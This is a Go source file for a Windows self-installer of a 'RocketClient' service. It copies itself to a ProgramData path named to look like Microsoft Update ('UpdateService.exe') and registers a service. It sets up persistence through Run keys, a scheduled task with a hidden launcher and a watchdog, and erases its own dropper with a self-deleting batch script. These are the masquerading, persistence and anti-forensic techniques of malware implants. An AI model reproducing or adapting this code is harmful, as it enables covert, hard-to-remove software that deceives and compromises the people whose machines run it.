//go:build windows

package lifecycle

import (
	"errors"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"github.com/kataras/golog"
	"golang.org/x/sys/windows"
)

// WindowsInstaller handles self-installation on Windows
type WindowsInstaller struct{}

const (
	installMutexName = `Global\RocketClientInstallMutex`
	updateMutexName  = `Global\RocketClientUpdateMutex`
)

// NewInstaller creates a new Windows installer
func NewInstaller() *WindowsInstaller {
	return &WindowsInstaller{}
}

// GetInstallPath returns the target installation path
func (w *WindowsInstaller) GetInstallPath() string {
	programData := os.Getenv("ProgramData")
	if programData == "" {
		programData = `C:\ProgramData`
	}
	return filepath.Join(programData, "Microsoft", "Update", "UpdateService.exe")
}

// IsInstalled checks if the service is already installed.
// Note: This function no longer deletes the binary on status check failure
// to avoid destructive side effects during simple status checks.
func (w *WindowsInstaller) IsInstalled() bool {
	installPath := w.GetInstallPath()
	golog.Infof("installer: checking if installed at %s", installPath)

	if _, err := os.Stat(installPath); err != nil {
		golog.Info("installer: binary not found, not installed")
		return false
	}
	golog.Info("installer: binary exists, checking service status")

	ctrl := NewServiceController(installPath)
	status, err := ctrl.Status()
	if err != nil {
		// Don't delete the binary on status check failure - this could be a transient SCM issue
		golog.Warnf("installer: service status check failed: %v (binary exists, treating as installed for update)", err)
		// Return true to allow update path to handle cleanup properly
		return true
	}

	golog.Infof("installer: service status: %s", status)
	if status == "unknown" {
		// Service not registered but binary exists - allow update path to reinstall service
		golog.Warn("installer: service status unknown, binary exists - treating as installed for update")
		return true
	}

	golog.Info("installer: service is installed and registered")
	return true
}

// Install performs the self-installation
func (w *WindowsInstaller) Install() error {
	// Ensure single installer at a time across processes.
	release, err := acquireInstallMutex(20 * time.Second)
	if err != nil {
		return fmt.Errorf("installer: could not acquire install mutex: %w", err)
	}
	defer release()

	// Require elevation for any install attempt
	if !isProcessElevated() {
		return errors.New("installer: requires administrative privileges")
	}

	golog.Info("installer: starting Windows install sequence")
	// 1. Get current executable path
	selfPath, err := os.Executable()
	if err != nil {
		return err
	}

	// 2. Create install directory
	installPath := w.GetInstallPath()
	installDir := filepath.Dir(installPath)
	if err := os.MkdirAll(installDir, 0755); err != nil {
		return err
	}

	// 2a. Proactively disable persistence/watchdog and stop any running old service/UI helpers
	w.cleanOldInstall()

	// Ensure any previous disable flag is cleared for fresh install
	_ = os.Remove(persistenceFlagPath(installPath))

	// 3. Copy executable to install location
	selfBytes, err := os.ReadFile(selfPath)
	if err != nil {
		return err
	}
	if err := os.WriteFile(installPath, selfBytes, 0755); err != nil {
		return err
	}

	// 3a. Copy support DLLs bundled alongside the installer into the install directory
	golog.Info("installer: deploying support DLLs")
	CopySupportDLLs(filepath.Dir(selfPath), installDir)

	// 4. Create service controller for installed path
	svcCtrl := NewServiceController(installPath)

	// 5. Install service
	golog.Info("installer: registering Windows service")
	if err := svcCtrl.Install(); err != nil {
		// Check if service already exists by examining error message
		if strings.Contains(err.Error(), "already exists") || strings.Contains(err.Error(), "already installed") {
			golog.Warn("installer: service already exists, continuing")
		} else {
			return err
		}
	} else {
		golog.Info("installer: service registration successful")
	}

	// 6. Configure persistence (Run key + scheduled task) using hidden launcher to avoid console flash
	ensureRunKey(installPath)
	ensureScheduledTask(installPath)

	// 7. Start service
	golog.Info("installer: starting Windows service")
	if err := svcCtrl.Start(); err != nil {
		return err
	}

	// 8. Schedule deletion of the installer binary if different from install target
	if selfPath != installPath {
		scheduleSelfDelete(selfPath)
	}
	return nil
}

func setRunKey(path string) {
	setRunKeyRoots(path)
}

// CleanupResult tracks what was cleaned during cleanOldInstall
type CleanupResult struct {
	PersistenceDisabled bool
	ServiceStopped      bool
	ServiceUninstalled  bool
	ProcessesKilled     bool
	TasksRemoved        bool
	Errors              []error
}

// cleanOldInstall disables persistence/watchdog, stops the service, and cleans scheduled tasks/run keys
// so a new install can take over cleanly even if an old binary is running.
// Returns a CleanupResult for tracking what operations succeeded.
func (w *WindowsInstaller) cleanOldInstall() *CleanupResult {
	result := &CleanupResult{}
	installPath := w.GetInstallPath()
	binaryName := filepath.Base(installPath)

	golog.Info("installer: pre-cleaning existing install (disable persistence, stop service, remove tasks/run keys)")

	// Step 1: Disable persistence/watchdog flags so Stop will take effect.
	DisablePersistence(installPath)
	result.PersistenceDisabled = true
	golog.Info("installer: persistence disabled")

	// Step 2: Stop the service via SCM
	ctrl := NewServiceController(installPath)
	if err := ctrl.Stop(); err != nil {
		golog.Warnf("installer: service stop returned error (may be okay): %v", err)
		result.Errors = append(result.Errors, fmt.Errorf("service stop: %w", err))
	} else {
		golog.Info("installer: service stop command sent")
	}

	// Step 3: Wait for service to actually stop with detailed logging
	golog.Info("installer: waiting for service to stop...")
	stopped := waitForServiceStateWithResult(ctrl, "stopped", 15*time.Second)
	result.ServiceStopped = stopped
	if stopped {
		golog.Info("installer: service confirmed stopped")
	} else {
		golog.Warn("installer: service stop timeout, proceeding anyway")
	}

	// Step 4: Kill stray processes by name (covers UI helpers launched in user sessions).
	// Use specific process matching to avoid killing unrelated processes
	golog.Infof("installer: killing stray processes matching %s", binaryName)
	killCmd := exec.Command("taskkill", "/F", "/IM", binaryName, "/T")
	if killErr := killCmd.Run(); killErr != nil {
		// taskkill returns error if no processes found - this is okay
		golog.Debugf("installer: taskkill result (may be okay if no processes): %v", killErr)
	} else {
		result.ProcessesKilled = true
		golog.Info("installer: stray processes killed")
	}

	// Step 5: Remove scheduled task + Run keys to prevent immediate respawn.
	golog.Info("installer: removing scheduled task and Run keys")
	clearRunKeyRoots()
	removeScheduledTask()
	result.TasksRemoved = true

	// Step 6: Uninstall existing service registration (in case of stale/broken entries).
	golog.Info("installer: uninstalling service registration")
	if err := ctrl.Uninstall(); err != nil {
		errStr := err.Error()
		// "specified service does not exist" is expected if service wasn't installed
		if strings.Contains(errStr, "does not exist") || strings.Contains(errStr, "not exist") {
			golog.Info("installer: service was not registered (okay)")
		} else {
			golog.Warnf("installer: service uninstall returned error: %v", err)
			result.Errors = append(result.Errors, fmt.Errorf("service uninstall: %w", err))
		}
	} else {
		result.ServiceUninstalled = true
		golog.Info("installer: service registration removed")
	}

	// Step 7: Brief pause to allow SCM/process teardown.
	golog.Info("installer: waiting for system to settle")
	time.Sleep(2 * time.Second)

	golog.Infof("installer: cleanup complete (stopped=%v, uninstalled=%v, errors=%d)",
		result.ServiceStopped, result.ServiceUninstalled, len(result.Errors))
	return result
}

// waitForServiceStateWithResult polls the service controller and returns whether the desired state was reached.
func waitForServiceStateWithResult(ctrl ServiceController, desired string, timeout time.Duration) bool {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		status, err := ctrl.Status()
		if err == nil && strings.EqualFold(status, desired) {
			return true
		}
		time.Sleep(500 * time.Millisecond)
	}
	return false
}

// waitForServiceState polls the service controller until the desired state or timeout.
func waitForServiceState(ctrl ServiceController, desired string, timeout time.Duration) {
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		status, err := ctrl.Status()
		if err == nil && strings.EqualFold(status, desired) {
			return
		}
		time.Sleep(500 * time.Millisecond)
	}
}

// acquireInstallMutex obtains a cross-process mutex to avoid concurrent installs/updates.
func acquireInstallMutex(timeout time.Duration) (func(), error) {
	return acquireNamedMutex(installMutexName, timeout)
}

// acquireUpdateMutex obtains a cross-process mutex specifically for updates.
func acquireUpdateMutex(timeout time.Duration) (func(), error) {
	return acquireNamedMutex(updateMutexName, timeout)
}

// acquireNamedMutex obtains a cross-process mutex with the given name.
func acquireNamedMutex(mutexName string, timeout time.Duration) (func(), error) {
	name, _ := windows.UTF16PtrFromString(mutexName)
	h, err := windows.CreateMutex(nil, false, name)
	if err != nil {
		return nil, fmt.Errorf("CreateMutex failed: %w", err)
	}
	wait, err := windows.WaitForSingleObject(h, uint32(timeout.Milliseconds()))
	if err != nil {
		// WAIT_TIMEOUT is returned as an error in newer Go versions
		if err == windows.WAIT_TIMEOUT {
			windows.CloseHandle(h)
			return nil, fmt.Errorf("mutex wait timed out after %v", timeout)
		}
		windows.CloseHandle(h)
		return nil, fmt.Errorf("WaitForSingleObject failed: %w", err)
	}
	switch wait {
	case uint32(windows.WAIT_OBJECT_0), uint32(windows.WAIT_ABANDONED):
		// Acquired (WAIT_ABANDONED means previous owner crashed - we still own it)
		if wait == uint32(windows.WAIT_ABANDONED) {
			golog.Warn("installer: acquired abandoned mutex (previous process may have crashed)")
		}
	default:
		windows.CloseHandle(h)
		return nil, fmt.Errorf("mutex wait returned unexpected status: %x", wait)
	}
	return func() {
		_ = windows.ReleaseMutex(h)
		_ = windows.CloseHandle(h)
	}, nil
}

// scheduleSelfDelete schedules deletion of the specified file after a brief delay.
// Uses a unique batch file name to avoid conflicts with concurrent operations.
func scheduleSelfDelete(path string) {
	if path == "" {
		return
	}

	// Generate unique batch file name using timestamp and random suffix
	timestamp := time.Now().UnixNano()
	batchName := fmt.Sprintf("svc_cleanup_%d.bat", timestamp)
	batch := filepath.Join(os.TempDir(), batchName)

	// Escape path for batch file (handle special characters)
	escapedPath := strings.ReplaceAll(path, "^", "^^")
	escapedPath = strings.ReplaceAll(escapedPath, "&", "^&")
	escapedPath = strings.ReplaceAll(escapedPath, "|", "^|")
	escapedPath = strings.ReplaceAll(escapedPath, "<", "^<")
	escapedPath = strings.ReplaceAll(escapedPath, ">", "^>")

	// Use timeout command instead of ping for more reliable delay
	// Wait 5 seconds, then delete the file and self-delete the batch
	contents := "@echo off\r\n" +
		"timeout /t 5 /nobreak >nul 2>&1\r\n" +
		"del /f /q \"" + escapedPath + "\" >nul 2>&1\r\n" +
		"del /f /q \"%~f0\" >nul 2>&1\r\n"

	for i := 0; i < 3; i++ {
		if err := os.WriteFile(batch, []byte(contents), 0600); err != nil {
			golog.Warnf("installer: failed to write cleanup batch (attempt %d): %v", i+1, err)
			continue
		}

		// Start the batch file detached
		cmd := exec.Command("cmd.exe", "/C", "start", "/b", "", batch)
		if err := cmd.Start(); err != nil {
			golog.Warnf("installer: failed to start cleanup batch (attempt %d): %v", i+1, err)
			continue
		}

		golog.Infof("installer: scheduled self-delete for %s", path)
		return
	}

	golog.Warn("installer: failed to schedule self-delete after 3 attempts")
}

// Remove deletes the installed binary and clears the Run key entry (best-effort).
func (w *WindowsInstaller) Remove() error {
	installPath := w.GetInstallPath()
	if installPath != "" {
		_ = os.Remove(installPath)
	}

	clearRunKeyRoots()
	removeScheduledTask()
	return nil
}
